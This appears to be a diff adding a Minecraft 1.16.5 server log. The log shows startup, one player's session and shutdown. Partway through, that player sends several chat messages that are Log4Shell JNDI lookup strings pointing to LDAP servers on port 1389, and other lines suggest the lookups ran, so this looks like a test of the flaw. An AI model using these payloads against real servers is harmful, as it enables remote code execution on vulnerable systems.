@@ -1,0 +1,100 @@
+[15:53:55] [main/INFO]: Environment: authHost='https://authserver.mojang.com', accountsHost='https://api.mojang.com', sessionHost='https://sessionserver.mojang.com', servicesHost='https://api.minecraftservices.com', name='PROD'
+[15:53:56] [main/WARN]: Ambiguity between arguments [teleport, destination] and [teleport, targets] with inputs: [Player, 0123, @e, dd12be42-52a9-4a91-a8a1-11c01849e498]
+[15:53:56] [main/WARN]: Ambiguity between arguments [teleport, location] and [teleport, destination] with inputs: [0.1 -0.5 .9, 0 0 0]
+[15:53:56] [main/WARN]: Ambiguity between arguments [teleport, location] and [teleport, targets] with inputs: [0.1 -0.5 .9, 0 0 0]
+[15:53:56] [main/WARN]: Ambiguity between arguments [teleport, targets] and [teleport, destination] with inputs: [Player, 0123, dd12be42-52a9-4a91-a8a1-11c01849e498]
+[15:53:56] [main/WARN]: Ambiguity between arguments [teleport, targets, location] and [teleport, targets, destination] with inputs: [0.1 -0.5 .9, 0 0 0]
+[15:53:56] [main/INFO]: Reloading ResourceManager: Default
+[15:53:58] [Worker-Main-14/INFO]: Loaded 7 recipes
+[15:53:58] [Worker-Main-14/INFO]: Loaded 927 advancements
+[15:54:02] [Server thread/INFO]: Starting minecraft server version 1.16.5
+[15:54:02] [Server thread/INFO]: Loading properties
+[15:54:02] [Server thread/INFO]: Default game type: SURVIVAL
+[15:54:02] [Server thread/INFO]: Generating keypair
+[15:54:02] [Server thread/INFO]: Starting Minecraft server on *:25565
+[15:54:02] [Server thread/INFO]: Using default channel type
+[15:54:10] [Server thread/INFO]: Preparing level "world"
+[15:54:17] [Server thread/INFO]: Preparing start region for dimension minecraft:overworld
+[15:54:17] [Worker-Main-9/INFO]: Preparing spawn area: 0%
+[15:54:17] [Worker-Main-10/INFO]: Preparing spawn area: 0%
+[15:54:18] [Worker-Main-13/INFO]: Preparing spawn area: 2%
+[15:54:18] [Worker-Main-10/INFO]: Preparing spawn area: 5%
+[15:54:19] [Worker-Main-12/INFO]: Preparing spawn area: 7%
+[15:54:19] [Worker-Main-10/INFO]: Preparing spawn area: 12%
+[15:54:20] [Worker-Main-8/INFO]: Preparing spawn area: 14%
+[15:54:20] [Worker-Main-14/INFO]: Preparing spawn area: 20%
+[15:54:21] [Worker-Main-11/INFO]: Preparing spawn area: 23%
+[15:54:21] [Worker-Main-9/INFO]: Preparing spawn area: 28%
+[15:54:22] [Worker-Main-8/INFO]: Preparing spawn area: 33%
+[15:54:22] [Worker-Main-13/INFO]: Preparing spawn area: 34%
+[15:54:23] [Worker-Main-10/INFO]: Preparing spawn area: 34%
+[15:54:23] [Worker-Main-13/INFO]: Preparing spawn area: 43%
+[15:54:24] [Worker-Main-11/INFO]: Preparing spawn area: 43%
+[15:54:24] [Worker-Main-12/INFO]: Preparing spawn area: 55%
+[15:54:25] [Worker-Main-13/INFO]: Preparing spawn area: 64%
+[15:54:25] [Worker-Main-8/INFO]: Preparing spawn area: 69%
+[15:54:26] [Worker-Main-14/INFO]: Preparing spawn area: 77%
+[15:54:26] [Worker-Main-13/INFO]: Preparing spawn area: 83%
+[15:54:27] [Worker-Main-13/INFO]: Preparing spawn area: 89%
+[15:54:27] [Worker-Main-14/INFO]: Preparing spawn area: 98%
+[15:54:27] [Server thread/INFO]: Time elapsed: 10626 ms
+[15:54:27] [Server thread/INFO]: Done (17.481s)! For help, type "help"
+[15:56:56] [User Authenticator #1/INFO]: UUID of player happy411509 is 0954ed57-070f-4e3e-840a-7c9204d33e14
+[15:56:56] [Server thread/INFO]: happy411509[/127.0.0.1:14199] logged in with entity id 290 at (23.5, 64.0, 148.5)
+[15:56:56] [Server thread/INFO]: happy411509 joined the game
+[16:02:47] [Server thread/INFO]: <happy411509> Reference Class Name: foo
+
+[16:03:41] [Server thread/INFO]: <happy411509> Reference Class Name: foo
+
+[16:04:21] [Server thread/INFO]: <happy411509> Reference Class Name: foo
+
+[16:06:32] [Server thread/INFO]: happy411509 was slain by Zombie
+[16:07:41] [Server thread/INFO]: happy411509 has made the advancement [Monster Hunter]
+[16:08:02] [Server thread/INFO]: happy411509 was slain by Zombie
+[16:08:29] [Server thread/INFO]: happy411509 was slain by Zombie
+[16:13:37] [Server thread/INFO]: happy411509 was slain by Zombie
+[16:19:26] [Server thread/INFO]: happy411509 has made the advancement [Stone Age]
+[16:21:20] [Server thread/INFO]: happy411509 has made the advancement [Getting an Upgrade]
+[16:33:11] [Server thread/INFO]: happy411509 has made the advancement [Sweet Dreams]
+[16:42:10] [Server thread/INFO]: happy411509 has made the advancement [Acquire Hardware]
+[16:58:36] [Server thread/INFO]: happy411509 has made the advancement [Hot Stuff]
+[17:07:11] [Server thread/INFO]: happy411509 has made the advancement [We Need to Go Deeper]
+[17:09:51] [Server thread/INFO]: happy411509 was shot by Skeleton
+[17:15:08] [Server thread/INFO]: happy411509 fell from a high place
+[17:23:06] [Server thread/INFO]: <happy411509> ${jndi:ldap://172.27.222.60:1389/kcoxkd}
+[17:23:26] [Server thread/INFO]: <happy411509> Reference Class Name: foo
+
+[17:26:18] [Server thread/INFO]: <happy411509> ${jndi:ldap://192.168.181.236:1389/8fk2r9}
+[17:26:24] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 6168ms or 123 ticks behind
+[17:26:51] [Server thread/INFO]: <happy411509> ${jndi:ldap://192.168.181.236:1389/8fk2r9}
+[17:26:57] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 6159ms or 123 ticks behind
+[17:28:06] [Server thread/INFO]: <happy411509> ${jndi:ldap://127.0.0.1:1389/ksqss8}
+[17:28:13] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 6121ms or 122 ticks behind
+[17:28:59] [Server thread/INFO]: <happy411509> ${jndi:ldap://127.0.0.1:1389/ksqss8}
+[17:29:05] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 6141ms or 122 ticks behind
+[17:29:16] [Server thread/INFO]: <happy411509> ${jndi:ldap://127.0.0.1:1389/1dq594}
+[17:29:22] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 2581ms or 51 ticks behind
+[17:30:06] [Server thread/INFO]: <happy411509> Reference Class Name: foo
+
+[17:33:31] [Server thread/INFO]: <happy411509> Reference Class Name: foo
+
+[17:36:28] [Server thread/INFO]: <happy411509> Reference Class Name: foo
+
+[17:37:23] [Server thread/INFO]: <happy411509> Reference Class Name: foo
+
+[19:08:31] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 5320201ms or 106404 ticks behind
+[19:08:31] [Server thread/INFO]: happy411509 lost connection: Timed out
+[19:08:32] [Server thread/INFO]: happy411509 left the game
+[19:15:50] [Server thread/INFO]: Stopping the server
+[19:15:50] [Server thread/INFO]: Stopping server
+[19:15:50] [Server thread/INFO]: Saving players
+[19:15:50] [Server thread/INFO]: Saving worlds
+[19:15:50] [Server thread/INFO]: Saving chunks for level 'ServerLevel[world]'/minecraft:overworld
+[19:15:50] [Server thread/INFO]: ThreadedAnvilChunkStorage (world): All chunks are saved
+[19:15:50] [Server thread/INFO]: Saving chunks for level 'ServerLevel[world]'/minecraft:the_nether
+[19:15:51] [Server thread/INFO]: ThreadedAnvilChunkStorage (DIM-1): All chunks are saved
+[19:15:51] [Server thread/INFO]: Saving chunks for level 'ServerLevel[world]'/minecraft:the_end
+[19:15:51] [Server thread/INFO]: ThreadedAnvilChunkStorage (DIM1): All chunks are saved
+[19:15:51] [Server thread/INFO]: ThreadedAnvilChunkStorage (world): All chunks are saved
+[19:15:51] [Server thread/INFO]: ThreadedAnvilChunkStorage (DIM-1): All chunks are saved
+[19:15:51] [Server thread/INFO]: ThreadedAnvilChunkStorage (DIM1): All chunks are saved
